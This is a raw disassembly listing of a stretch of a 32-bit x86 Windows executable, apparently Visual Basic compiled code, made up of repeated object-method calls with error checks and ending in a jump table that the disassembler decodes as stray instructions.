  4088bb:	db e2                	fnclex
  4088bd:	7d 12                	jge    0x4088d1
  4088bf:	68 a0 00 00 00       	push   $0xa0
  4088c4:	68 38 30 40 00       	push   $0x403038
  4088c9:	57                   	push   %edi
  4088ca:	50                   	push   %eax
  4088cb:	ff 15 38 10 40 00    	call   *0x401038
  4088d1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4088d4:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4088da:	51                   	push   %ecx
  4088db:	68 5c 35 40 00       	push   $0x40355c
  4088e0:	8b 38                	mov    (%eax),%edi
  4088e2:	ff 15 28 10 40 00    	call   *0x401028
  4088e8:	8b d0                	mov    %eax,%edx
  4088ea:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4088ed:	ff 15 38 11 40 00    	call   *0x401138
  4088f3:	8b d7                	mov    %edi,%edx
  4088f5:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4088fb:	50                   	push   %eax
  4088fc:	57                   	push   %edi
  4088fd:	e9 cf da ff ff       	jmp    0x4063d1
  408902:	8b 0e                	mov    (%esi),%ecx
  408904:	56                   	push   %esi
  408905:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40890b:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40890e:	50                   	push   %eax
  40890f:	52                   	push   %edx
  408910:	ff d3                	call   *%ebx
  408912:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408918:	8b 06                	mov    (%esi),%eax
  40891a:	56                   	push   %esi
  40891b:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408921:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408924:	50                   	push   %eax
  408925:	51                   	push   %ecx
  408926:	ff d3                	call   *%ebx
  408928:	8b f8                	mov    %eax,%edi
  40892a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40892d:	50                   	push   %eax
  40892e:	57                   	push   %edi
  40892f:	8b 17                	mov    (%edi),%edx
  408931:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  408937:	85 c0                	test   %eax,%eax
  408939:	db e2                	fnclex
  40893b:	7d 12                	jge    0x40894f
  40893d:	68 a0 00 00 00       	push   $0xa0
  408942:	68 38 30 40 00       	push   $0x403038
  408947:	57                   	push   %edi
  408948:	50                   	push   %eax
  408949:	ff 15 38 10 40 00    	call   *0x401038
  40894f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  408952:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  408958:	52                   	push   %edx
  408959:	68 74 35 40 00       	push   $0x403574
  40895e:	8b 39                	mov    (%ecx),%edi
  408960:	ff 15 28 10 40 00    	call   *0x401028
  408966:	8b d0                	mov    %eax,%edx
  408968:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40896b:	ff 15 38 11 40 00    	call   *0x401138
  408971:	89 bd 0c fe ff ff    	mov    %edi,-0x1f4(%ebp)
  408977:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40897d:	50                   	push   %eax
  40897e:	8b 85 0c fe ff ff    	mov    -0x1f4(%ebp),%eax
  408984:	57                   	push   %edi
  408985:	e9 df da ff ff       	jmp    0x406469
  40898a:	8b 16                	mov    (%esi),%edx
  40898c:	56                   	push   %esi
  40898d:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408993:	50                   	push   %eax
  408994:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408997:	50                   	push   %eax
  408998:	ff d3                	call   *%ebx
  40899a:	8b 0e                	mov    (%esi),%ecx
  40899c:	56                   	push   %esi
  40899d:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4089a3:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4089a9:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4089ac:	50                   	push   %eax
  4089ad:	52                   	push   %edx
  4089ae:	ff d3                	call   *%ebx
  4089b0:	8b f8                	mov    %eax,%edi
  4089b2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4089b5:	51                   	push   %ecx
  4089b6:	57                   	push   %edi
  4089b7:	8b 07                	mov    (%edi),%eax
  4089b9:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4089bf:	85 c0                	test   %eax,%eax
  4089c1:	db e2                	fnclex
  4089c3:	7d 12                	jge    0x4089d7
  4089c5:	68 a0 00 00 00       	push   $0xa0
  4089ca:	68 38 30 40 00       	push   $0x403038
  4089cf:	57                   	push   %edi
  4089d0:	50                   	push   %eax
  4089d1:	ff 15 38 10 40 00    	call   *0x401038
  4089d7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4089da:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4089e0:	50                   	push   %eax
  4089e1:	68 90 35 40 00       	push   $0x403590
  4089e6:	8b 3a                	mov    (%edx),%edi
  4089e8:	ff 15 28 10 40 00    	call   *0x401028
  4089ee:	8b d0                	mov    %eax,%edx
  4089f0:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4089f3:	ff 15 38 11 40 00    	call   *0x401138
  4089f9:	8b cf                	mov    %edi,%ecx
  4089fb:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408a01:	50                   	push   %eax
  408a02:	57                   	push   %edi
  408a03:	e9 7f 01 00 00       	jmp    0x408b87
  408a08:	8b 06                	mov    (%esi),%eax
  408a0a:	56                   	push   %esi
  408a0b:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408a11:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  408a14:	50                   	push   %eax
  408a15:	51                   	push   %ecx
  408a16:	ff d3                	call   *%ebx
  408a18:	8b 16                	mov    (%esi),%edx
  408a1a:	56                   	push   %esi
  408a1b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408a21:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408a27:	50                   	push   %eax
  408a28:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  408a2b:	50                   	push   %eax
  408a2c:	ff d3                	call   *%ebx
  408a2e:	8b f8                	mov    %eax,%edi
  408a30:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408a33:	52                   	push   %edx
  408a34:	57                   	push   %edi
  408a35:	8b 0f                	mov    (%edi),%ecx
  408a37:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  408a3d:	85 c0                	test   %eax,%eax
  408a3f:	db e2                	fnclex
  408a41:	7d 12                	jge    0x408a55
  408a43:	68 a0 00 00 00       	push   $0xa0
  408a48:	68 38 30 40 00       	push   $0x403038
  408a4d:	57                   	push   %edi
  408a4e:	50                   	push   %eax
  408a4f:	ff 15 38 10 40 00    	call   *0x401038
  408a55:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  408a58:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  408a5e:	51                   	push   %ecx
  408a5f:	68 ac 35 40 00       	push   $0x4035ac
  408a64:	8b 38                	mov    (%eax),%edi
  408a66:	ff 15 28 10 40 00    	call   *0x401028
  408a6c:	8b d0                	mov    %eax,%edx
  408a6e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408a71:	ff 15 38 11 40 00    	call   *0x401138
  408a77:	8b d7                	mov    %edi,%edx
  408a79:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408a7f:	50                   	push   %eax
  408a80:	57                   	push   %edi
  408a81:	e9 4b d9 ff ff       	jmp    0x4063d1
  408a86:	8b 0e                	mov    (%esi),%ecx
  408a88:	56                   	push   %esi
  408a89:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408a8f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  408a92:	50                   	push   %eax
  408a93:	52                   	push   %edx
  408a94:	ff d3                	call   *%ebx
  408a96:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408a9c:	8b 06                	mov    (%esi),%eax
  408a9e:	56                   	push   %esi
  408a9f:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408aa5:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408aa8:	50                   	push   %eax
  408aa9:	51                   	push   %ecx
  408aaa:	ff d3                	call   *%ebx
  408aac:	8b f8                	mov    %eax,%edi
  408aae:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408ab1:	50                   	push   %eax
  408ab2:	57                   	push   %edi
  408ab3:	8b 17                	mov    (%edi),%edx
  408ab5:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  408abb:	85 c0                	test   %eax,%eax
  408abd:	db e2                	fnclex
  408abf:	7d 12                	jge    0x408ad3
  408ac1:	68 a0 00 00 00       	push   $0xa0
  408ac6:	68 38 30 40 00       	push   $0x403038
  408acb:	57                   	push   %edi
  408acc:	50                   	push   %eax
  408acd:	ff 15 38 10 40 00    	call   *0x401038
  408ad3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  408ad6:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  408adc:	52                   	push   %edx
  408add:	68 cc 35 40 00       	push   $0x4035cc
  408ae2:	8b 39                	mov    (%ecx),%edi
  408ae4:	ff 15 28 10 40 00    	call   *0x401028
  408aea:	8b d0                	mov    %eax,%edx
  408aec:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408aef:	ff 15 38 11 40 00    	call   *0x401138
  408af5:	89 bd 00 fe ff ff    	mov    %edi,-0x200(%ebp)
  408afb:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408b01:	50                   	push   %eax
  408b02:	8b 85 00 fe ff ff    	mov    -0x200(%ebp),%eax
  408b08:	57                   	push   %edi
  408b09:	e9 5b d9 ff ff       	jmp    0x406469
  408b0e:	8b 16                	mov    (%esi),%edx
  408b10:	56                   	push   %esi
  408b11:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408b17:	50                   	push   %eax
  408b18:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408b1b:	50                   	push   %eax
  408b1c:	ff d3                	call   *%ebx
  408b1e:	8b 0e                	mov    (%esi),%ecx
  408b20:	56                   	push   %esi
  408b21:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408b27:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408b2d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  408b30:	50                   	push   %eax
  408b31:	52                   	push   %edx
  408b32:	ff d3                	call   *%ebx
  408b34:	8b f8                	mov    %eax,%edi
  408b36:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408b39:	51                   	push   %ecx
  408b3a:	57                   	push   %edi
  408b3b:	8b 07                	mov    (%edi),%eax
  408b3d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  408b43:	85 c0                	test   %eax,%eax
  408b45:	db e2                	fnclex
  408b47:	7d 12                	jge    0x408b5b
  408b49:	68 a0 00 00 00       	push   $0xa0
  408b4e:	68 38 30 40 00       	push   $0x403038
  408b53:	57                   	push   %edi
  408b54:	50                   	push   %eax
  408b55:	ff 15 38 10 40 00    	call   *0x401038
  408b5b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408b5e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  408b64:	50                   	push   %eax
  408b65:	68 e8 35 40 00       	push   $0x4035e8
  408b6a:	8b 3a                	mov    (%edx),%edi
  408b6c:	ff 15 28 10 40 00    	call   *0x401028
  408b72:	8b d0                	mov    %eax,%edx
  408b74:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408b77:	ff 15 38 11 40 00    	call   *0x401138
  408b7d:	8b cf                	mov    %edi,%ecx
  408b7f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408b85:	50                   	push   %eax
  408b86:	57                   	push   %edi
  408b87:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  408b8d:	85 c0                	test   %eax,%eax
  408b8f:	db e2                	fnclex
  408b91:	0f 8d 0e 02 00 00    	jge    0x408da5
  408b97:	e9 f7 01 00 00       	jmp    0x408d93
  408b9c:	8b 06                	mov    (%esi),%eax
  408b9e:	56                   	push   %esi
  408b9f:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408ba5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  408ba8:	50                   	push   %eax
  408ba9:	51                   	push   %ecx
  408baa:	ff d3                	call   *%ebx
  408bac:	8b 16                	mov    (%esi),%edx
  408bae:	56                   	push   %esi
  408baf:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408bb5:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408bbb:	50                   	push   %eax
  408bbc:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  408bbf:	50                   	push   %eax
  408bc0:	ff d3                	call   *%ebx
  408bc2:	8b f8                	mov    %eax,%edi
  408bc4:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408bc7:	52                   	push   %edx
  408bc8:	57                   	push   %edi
  408bc9:	8b 0f                	mov    (%edi),%ecx
  408bcb:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  408bd1:	85 c0                	test   %eax,%eax
  408bd3:	db e2                	fnclex
  408bd5:	7d 12                	jge    0x408be9
  408bd7:	68 a0 00 00 00       	push   $0xa0
  408bdc:	68 38 30 40 00       	push   $0x403038
  408be1:	57                   	push   %edi
  408be2:	50                   	push   %eax
  408be3:	ff 15 38 10 40 00    	call   *0x401038
  408be9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  408bec:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  408bf2:	51                   	push   %ecx
  408bf3:	68 00 36 40 00       	push   $0x403600
  408bf8:	8b 38                	mov    (%eax),%edi
  408bfa:	ff 15 28 10 40 00    	call   *0x401028
  408c00:	8b d0                	mov    %eax,%edx
  408c02:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408c05:	ff 15 38 11 40 00    	call   *0x401138
  408c0b:	8b d7                	mov    %edi,%edx
  408c0d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408c13:	50                   	push   %eax
  408c14:	57                   	push   %edi
  408c15:	ff 92 a4 00 00 00    	call   *0xa4(%edx)
  408c1b:	85 c0                	test   %eax,%eax
  408c1d:	db e2                	fnclex
  408c1f:	7d 12                	jge    0x408c33
  408c21:	68 a4 00 00 00       	push   $0xa4
  408c26:	68 38 30 40 00       	push   $0x403038
  408c2b:	57                   	push   %edi
  408c2c:	50                   	push   %eax
  408c2d:	ff 15 38 10 40 00    	call   *0x401038
  408c33:	8d 45 d8             	lea    -0x28(%ebp),%eax
  408c36:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408c39:	50                   	push   %eax
  408c3a:	51                   	push   %ecx
  408c3b:	6a 02                	push   $0x2
  408c3d:	ff 15 08 11 40 00    	call   *0x401108
  408c43:	8d 55 d0             	lea    -0x30(%ebp),%edx
  408c46:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  408c49:	52                   	push   %edx
  408c4a:	50                   	push   %eax
  408c4b:	e9 6d 01 00 00       	jmp    0x408dbd
  408c50:	8b 0e                	mov    (%esi),%ecx
  408c52:	56                   	push   %esi
  408c53:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408c59:	8d 55 d0             	lea    -0x30(%ebp),%edx
  408c5c:	50                   	push   %eax
  408c5d:	52                   	push   %edx
  408c5e:	ff d3                	call   *%ebx
  408c60:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408c66:	8b 06                	mov    (%esi),%eax
  408c68:	56                   	push   %esi
  408c69:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  408c6f:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408c72:	50                   	push   %eax
  408c73:	51                   	push   %ecx
  408c74:	ff d3                	call   *%ebx
  408c76:	8b f8                	mov    %eax,%edi
  408c78:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408c7b:	50                   	push   %eax
  408c7c:	57                   	push   %edi
  408c7d:	8b 17                	mov    (%edi),%edx
  408c7f:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  408c85:	85 c0                	test   %eax,%eax
  408c87:	db e2                	fnclex
  408c89:	7d 12                	jge    0x408c9d
  408c8b:	68 a0 00 00 00       	push   $0xa0
  408c90:	68 38 30 40 00       	push   $0x403038
  408c95:	57                   	push   %edi
  408c96:	50                   	push   %eax
  408c97:	ff 15 38 10 40 00    	call   *0x401038
  408c9d:	8b 55 dc             	mov    -0x24(%ebp),%edx
  408ca0:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  408ca6:	52                   	push   %edx
  408ca7:	68 18 36 40 00       	push   $0x403618
  408cac:	8b 39                	mov    (%ecx),%edi
  408cae:	ff 15 28 10 40 00    	call   *0x401028
  408cb4:	8b d0                	mov    %eax,%edx
  408cb6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408cb9:	ff 15 38 11 40 00    	call   *0x401138
  408cbf:	89 bd f4 fd ff ff    	mov    %edi,-0x20c(%ebp)
  408cc5:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408ccb:	50                   	push   %eax
  408ccc:	8b 85 f4 fd ff ff    	mov    -0x20c(%ebp),%eax
  408cd2:	57                   	push   %edi
  408cd3:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  408cd9:	85 c0                	test   %eax,%eax
  408cdb:	db e2                	fnclex
  408cdd:	7d 12                	jge    0x408cf1
  408cdf:	68 a4 00 00 00       	push   $0xa4
  408ce4:	68 38 30 40 00       	push   $0x403038
  408ce9:	57                   	push   %edi
  408cea:	50                   	push   %eax
  408ceb:	ff 15 38 10 40 00    	call   *0x401038
  408cf1:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408cf4:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408cf7:	51                   	push   %ecx
  408cf8:	52                   	push   %edx
  408cf9:	6a 02                	push   $0x2
  408cfb:	ff 15 08 11 40 00    	call   *0x401108
  408d01:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408d04:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408d07:	50                   	push   %eax
  408d08:	51                   	push   %ecx
  408d09:	e9 af 00 00 00       	jmp    0x408dbd
  408d0e:	8b 16                	mov    (%esi),%edx
  408d10:	56                   	push   %esi
  408d11:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  408d17:	50                   	push   %eax
  408d18:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408d1b:	50                   	push   %eax
  408d1c:	ff d3                	call   *%ebx
  408d1e:	8b 0e                	mov    (%esi),%ecx
  408d20:	56                   	push   %esi
  408d21:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  408d27:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  408d2d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  408d30:	50                   	push   %eax
  408d31:	52                   	push   %edx
  408d32:	ff d3                	call   *%ebx
  408d34:	8b f8                	mov    %eax,%edi
  408d36:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  408d39:	51                   	push   %ecx
  408d3a:	57                   	push   %edi
  408d3b:	8b 07                	mov    (%edi),%eax
  408d3d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  408d43:	85 c0                	test   %eax,%eax
  408d45:	db e2                	fnclex
  408d47:	7d 12                	jge    0x408d5b
  408d49:	68 a0 00 00 00       	push   $0xa0
  408d4e:	68 38 30 40 00       	push   $0x403038
  408d53:	57                   	push   %edi
  408d54:	50                   	push   %eax
  408d55:	ff 15 38 10 40 00    	call   *0x401038
  408d5b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408d5e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  408d64:	50                   	push   %eax
  408d65:	68 34 36 40 00       	push   $0x403634
  408d6a:	8b 3a                	mov    (%edx),%edi
  408d6c:	ff 15 28 10 40 00    	call   *0x401028
  408d72:	8b d0                	mov    %eax,%edx
  408d74:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408d77:	ff 15 38 11 40 00    	call   *0x401138
  408d7d:	8b cf                	mov    %edi,%ecx
  408d7f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  408d85:	50                   	push   %eax
  408d86:	57                   	push   %edi
  408d87:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  408d8d:	85 c0                	test   %eax,%eax
  408d8f:	db e2                	fnclex
  408d91:	7d 12                	jge    0x408da5
  408d93:	68 a4 00 00 00       	push   $0xa4
  408d98:	68 38 30 40 00       	push   $0x403038
  408d9d:	57                   	push   %edi
  408d9e:	50                   	push   %eax
  408d9f:	ff 15 38 10 40 00    	call   *0x401038
  408da5:	8d 55 d8             	lea    -0x28(%ebp),%edx
  408da8:	8d 45 dc             	lea    -0x24(%ebp),%eax
  408dab:	52                   	push   %edx
  408dac:	50                   	push   %eax
  408dad:	6a 02                	push   $0x2
  408daf:	ff 15 08 11 40 00    	call   *0x401108
  408db5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  408db8:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  408dbb:	51                   	push   %ecx
  408dbc:	52                   	push   %edx
  408dbd:	6a 02                	push   $0x2
  408dbf:	ff 15 20 10 40 00    	call   *0x401020
  408dc5:	83 c4 18             	add    $0x18,%esp
  408dc8:	8b 85 30 ff ff ff    	mov    -0xd0(%ebp),%eax
  408dce:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408dd1:	03 c1                	add    %ecx,%eax
  408dd3:	0f 80 6e 02 00 00    	jo     0x409047
  408dd9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  408ddc:	8b c8                	mov    %eax,%ecx
  408dde:	33 c0                	xor    %eax,%eax
  408de0:	e9 4a d4 ff ff       	jmp    0x40622f
  408de5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408de8:	68 30 8e 40 00       	push   $0x408e30
  408ded:	eb 40                	jmp    0x408e2f
  408def:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  408df2:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408df5:	51                   	push   %ecx
  408df6:	52                   	push   %edx
  408df7:	6a 02                	push   $0x2
  408df9:	ff 15 08 11 40 00    	call   *0x401108
  408dff:	8d 45 d0             	lea    -0x30(%ebp),%eax
  408e02:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  408e05:	50                   	push   %eax
  408e06:	51                   	push   %ecx
  408e07:	6a 02                	push   $0x2
  408e09:	ff 15 20 10 40 00    	call   *0x401020
  408e0f:	8d 55 80             	lea    -0x80(%ebp),%edx
  408e12:	8d 45 90             	lea    -0x70(%ebp),%eax
  408e15:	52                   	push   %edx
  408e16:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  408e19:	50                   	push   %eax
  408e1a:	8d 55 b0             	lea    -0x50(%ebp),%edx
  408e1d:	51                   	push   %ecx
  408e1e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  408e21:	52                   	push   %edx
  408e22:	50                   	push   %eax
  408e23:	6a 05                	push   $0x5
  408e25:	ff 15 18 10 40 00    	call   *0x401018
  408e2b:	83 c4 30             	add    $0x30,%esp
  408e2e:	c3                   	ret
  408e2f:	c3                   	ret
  408e30:	8b 45 08             	mov    0x8(%ebp),%eax
  408e33:	50                   	push   %eax
  408e34:	8b 08                	mov    (%eax),%ecx
  408e36:	ff 51 08             	call   *0x8(%ecx)
  408e39:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408e3c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408e3f:	5f                   	pop    %edi
  408e40:	5e                   	pop    %esi
  408e41:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  408e48:	5b                   	pop    %ebx
  408e49:	8b e5                	mov    %ebp,%esp
  408e4b:	5d                   	pop    %ebp
  408e4c:	c2 04 00             	ret    $0x4
  408e4f:	90                   	nop
  408e50:	f6 81 40 00 74 82 40 	testb  $0x40,-0x7d8bffc0(%ecx)
  408e57:	00 9e 62 40 00 f2    	add    %bl,-0xdffbf9e(%esi)
  408e5d:	82 40 00 7a          	addb   $0x7a,0x0(%eax)
  408e61:	83 40 00 f8          	addl   $0xfffffff8,0x0(%eax)
  408e65:	83 40 00 76          	addl   $0x76,0x0(%eax)
  408e69:	84 40 00             	test   %al,0x0(%eax)
  408e6c:	fe 84 40 00 7c 85 40 	incb   0x40857c00(%eax,%eax,2)
  408e73:	00 fa                	add    %bh,%dl
  408e75:	85 40 00             	test   %eax,0x0(%eax)
  408e78:	82 86 40 00 00 87 40 	addb   $0x40,-0x78ffffc0(%esi)
  408e7f:	00 7e 87             	add    %bh,-0x79(%esi)
  408e82:	40                   	inc    %eax
  408e83:	00 06                	add    %al,(%esi)
  408e85:	88 40 00             	mov    %al,0x0(%eax)
  408e88:	84 88 40 00 02 89    	test   %cl,-0x76fdffc0(%eax)
  408e8e:	40                   	inc    %eax
  408e8f:	00 8a 89 40 00 08    	add    %cl,0x8004089(%edx)
  408e95:	8a 40 00             	mov    0x0(%eax),%al
  408e98:	86 8a 40 00 0e 8b    	xchg   %cl,-0x74f1ffc0(%edx)
  408e9e:	40                   	inc    %eax
  408e9f:	00 9c 8b 40 00 50 8c 	add    %bl,-0x73afffc0(%ebx,%ecx,4)
  408ea6:	40                   	inc    %eax
  408ea7:	00 8a 6b 40 00 b1    	add    %cl,-0x4effbf95(%edx)
  408ead:	6c                   	insb   (%dx),%es:(%edi)
  408eae:	40                   	inc    %eax
  408eaf:	00 2b                	add    %ch,(%ebx)
  408eb1:	6e                   	outsb  %ds:(%esi),(%dx)
  408eb2:	40                   	inc    %eax
  408eb3:	00 c5                	add    %al,%ch
  408eb5:	6e                   	outsb  %ds:(%esi),(%dx)
  408eb6:	40                   	inc    %eax
  408eb7:	00 5f 6f             	add    %bl,0x6f(%edi)
  408eba:	40                   	inc    %eax
  408ebb:	00 f9                	add    %bh,%cl
  408ebd:	6f                   	outsl  %ds:(%esi),(%dx)
  408ebe:	40                   	inc    %eax
  408ebf:	00 93 70 40 00 2d    	add    %dl,0x2d004070(%ebx)
  408ec5:	71 40                	jno    0x408f07
  408ec7:	00 c7                	add    %al,%bh
  408ec9:	71 40                	jno    0x408f0b
  408ecb:	00 61 72             	add    %ah,0x72(%ecx)
  408ece:	40                   	inc    %eax
  408ecf:	00 0e                	add    %cl,(%esi)
  408ed1:	8d 40 00             	lea    0x0(%eax),%eax
  408ed4:	e6 63                	out    %al,$0x63
  408ed6:	40                   	inc    %eax
  408ed7:	00 7e 64             	add    %bh,0x64(%esi)
  408eda:	40                   	inc    %eax
  408edb:	00 fc                	add    %bh,%ah
  408edd:	64 40                	fs inc %eax
  408edf:	00 7a 65             	add    %bh,0x65(%edx)
  408ee2:	40                   	inc    %eax
  408ee3:	00 02                	add    %al,(%edx)
  408ee5:	66 40                	inc    %ax
  408ee7:	00 80 66 40 00 fe    	add    %al,-0x1ffbf9a(%eax)
  408eed:	66 40                	inc    %ax
  408eef:	00 86 67 40 00 04    	add    %al,0x4004067(%esi)
  408ef5:	68 40 00 82 68       	push   $0x68820040
  408efa:	40                   	inc    %eax
  408efb:	00 0a                	add    %cl,(%edx)
  408efd:	69 40 00 88 69 40 00 	imul   $0x406988,0x0(%eax),%eax
  408f04:	06                   	push   %es
  408f05:	6a 40                	push   $0x40
  408f07:	00 8e 6a 40 00 0c    	add    %cl,0xc00406a(%esi)
  408f0d:	6b 40 00 fb          	imul   $0xfffffffb,0x0(%eax),%eax
  408f11:	72 40                	jb     0x408f53
  408f13:	00 83 73 40 00 01    	add    %al,0x1004073(%ebx)
  408f19:	74 40                	je     0x408f5b
  408f1b:	00 7f 74             	add    %bh,0x74(%edi)
  408f1e:	40                   	inc    %eax
  408f1f:	00 07                	add    %al,(%edi)
  408f21:	75 40                	jne    0x408f63
  408f23:	00 85 75 40 00 03    	add    %al,0x3004075(%ebp)
  408f29:	76 40                	jbe    0x408f6b
  408f2b:	00 8b 76 40 00 09    	add    %cl,0x9004076(%ebx)
  408f31:	77 40                	ja     0x408f73
  408f33:	00 87 77 40 00 0f    	add    %al,0xf004077(%edi)
  408f39:	78 40                	js     0x408f7b
  408f3b:	00 8d 78 40 00 a7    	add    %cl,-0x58ffbf88(%ebp)
  408f41:	7c 40                	jl     0x408f83
  408f43:	00 0d 7c 40 00 a5    	add    %cl,0xa500407c
  408f49:	79 40                	jns    0x408f8b
  408f4b:	00 3f                	add    %bh,(%edi)
  408f4d:	7a 40                	jp     0x408f8f
  408f4f:	00 d9                	add    %bl,%cl
  408f51:	7a 40                	jp     0x408f93
  408f53:	00 73 7b             	add    %dh,0x7b(%ebx)
  408f56:	40                   	inc    %eax
  408f57:	00 7c 80 40          	add    %bh,0x40(%eax,%eax,4)
  408f5b:	00 68 7e             	add    %ch,0x7e(%eax)
  408f5e:	40                   	inc    %eax
  408f5f:	00 0b                	add    %cl,(%ebx)
  408f61:	79 40                	jns    0x408fa3
  408f63:	00 02                	add    %al,(%edx)
  408f65:	7f 40                	jg     0x408fa7
  408f67:	00 41 7d             	add    %al,0x7d(%ecx)
  408f6a:	40                   	inc    %eax
  408f6b:	00 c8                	add    %cl,%al
  408f6d:	8d 40 00             	lea    0x0(%eax),%eax
  408f70:	00 01                	add    %al,(%ecx)
  408f72:	47                   	inc    %edi
  408f73:	47                   	inc    %edi
  408f74:	47                   	inc    %edi
  408f75:	02 47 47             	add    0x47(%edi),%al
  408f78:	47                   	inc    %edi
  408f79:	03 04 05 06 47 47 47 	add    0x47474706(,%eax,1),%eax
  408f80:	47                   	inc    %edi
  408f81:	47                   	inc    %edi
  408f82:	47                   	inc    %edi
  408f83:	07                   	pop    %es
  408f84:	47                   	inc    %edi
